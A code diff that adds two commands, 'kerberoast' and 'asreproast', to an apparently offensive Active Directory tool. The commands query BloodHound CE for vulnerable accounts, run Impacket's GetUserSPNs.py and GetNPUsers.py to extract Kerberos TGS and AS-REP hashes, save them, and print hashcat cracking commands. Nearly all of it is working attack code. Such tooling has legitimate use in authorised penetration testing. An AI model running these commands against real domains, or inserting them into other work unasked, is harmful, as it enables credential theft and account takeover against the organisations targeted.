@@ -1032,5 +1032,145 @@ def validate(
         raise typer.Exit(code=1)
 
 
+@app.command()
+def kerberoast(
+    config: ConfigOption = None,
+    output: Annotated[
+        Optional[Path],
+        typer.Option("--output", "-o", help="Write hashes to file"),
+    ] = None,
+    verbose: VerboseOption = False,
+) -> None:
+    """Discover Kerberoastable users via BloodHound CE and extract TGS hashes.
+
+    Queries BH CE for enabled users with SPNs, then runs GetUserSPNs.py
+    to extract TGS tickets that can be cracked offline.
+
+    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+    domain = cfg.domain.name
+
+    from pathstrike.handlers.kerberos import (
+        discover_kerberoastable_users,
+        run_kerberoast,
+    )
+
+    async def _run():
+        async with BloodHoundClient.connect(cfg.bloodhound) as client:
+            # Step 1: Discover
+            console.print(f"[bold]Querying BH CE for Kerberoastable users in {domain.upper()}...[/]")
+            users = await discover_kerberoastable_users(client, domain)
+
+            if not users:
+                console.print("[yellow]No Kerberoastable users found.[/]")
+                return
+
+            console.print(f"Found [bold green]{len(users)}[/] Kerberoastable user(s):\n")
+            for u in users:
+                console.print(f"  - {u['name']}")
+            console.print()
+
+            # Step 2: Attack
+            console.print("[bold]Extracting TGS hashes via GetUserSPNs.py...[/]\n")
+            hashes = await run_kerberoast(cfg, target_users=users)
+
+            if not hashes:
+                console.print("[yellow]No TGS hashes extracted.[/]")
+                return
+
+            console.print(f"[bold green]Extracted {len(hashes)} TGS hash(es):[/]\n")
+            for h in hashes:
+                console.print(f"[dim]{h['hash'][:120]}...[/]")
+
+            # Step 3: Output
+            if output:
+                with open(output, "w") as fh:
+                    for h in hashes:
+                        fh.write(h["hash"] + "\n")
+                console.print(f"\n[green]Hashes written to {output}[/]")
+                console.print(f"Crack with: [bold]hashcat -m 13100 {output} wordlist.txt[/]")
+            else:
+                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
+                console.print("[bold]hashcat -m 13100 hashes.txt wordlist.txt[/]")
+
+    try:
+        asyncio.run(_run())
+    except Exception as exc:
+        console.print(f"[bold red]Error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+
+@app.command()
+def asreproast(
+    config: ConfigOption = None,
+    output: Annotated[
+        Optional[Path],
+        typer.Option("--output", "-o", help="Write hashes to file"),
+    ] = None,
+    verbose: VerboseOption = False,
+) -> None:
+    """Discover AS-REP roastable users via BloodHound CE and extract hashes.
+
+    Queries BH CE for enabled users with DONT_REQUIRE_PREAUTH, then runs
+    GetNPUsers.py to extract AS-REP hashes that can be cracked offline.
+
+    Use ``-o hashes.txt`` to save hashes in hashcat-compatible format.
+    """
+    setup_logging(verbose=verbose)
+    cfg = _load_config_or_exit(config)
+    domain = cfg.domain.name
+
+    from pathstrike.handlers.kerberos import (
+        discover_asrep_roastable_users,
+        run_asreproast,
+    )
+
+    async def _run():
+        async with BloodHoundClient.connect(cfg.bloodhound) as client:
+            # Step 1: Discover
+            console.print(f"[bold]Querying BH CE for AS-REP roastable users in {domain.upper()}...[/]")
+            users = await discover_asrep_roastable_users(client, domain)
+
+            if not users:
+                console.print("[yellow]No AS-REP roastable users found.[/]")
+                return
+
+            console.print(f"Found [bold green]{len(users)}[/] AS-REP roastable user(s):\n")
+            for u in users:
+                console.print(f"  - {u['name']}")
+            console.print()
+
+            # Step 2: Attack
+            console.print("[bold]Extracting AS-REP hashes via GetNPUsers.py...[/]\n")
+            hashes = await run_asreproast(cfg, target_users=users)
+
+            if not hashes:
+                console.print("[yellow]No AS-REP hashes extracted.[/]")
+                return
+
+            console.print(f"[bold green]Extracted {len(hashes)} AS-REP hash(es):[/]\n")
+            for h in hashes:
+                console.print(f"[dim]{h['hash'][:120]}...[/]")
+
+            # Step 3: Output
+            if output:
+                with open(output, "w") as fh:
+                    for h in hashes:
+                        fh.write(h["hash"] + "\n")
+                console.print(f"\n[green]Hashes written to {output}[/]")
+                console.print(f"Crack with: [bold]hashcat -m 18200 {output} wordlist.txt[/]")
+            else:
+                console.print("\nUse [bold]-o hashes.txt[/] to save, then:")
+                console.print("[bold]hashcat -m 18200 hashes.txt wordlist.txt[/]")
+
+    try:
+        asyncio.run(_run())
+    except Exception as exc:
+        console.print(f"[bold red]Error:[/] {exc}")
+        raise typer.Exit(code=1) from exc
+
+
 if __name__ == "__main__":
     app()
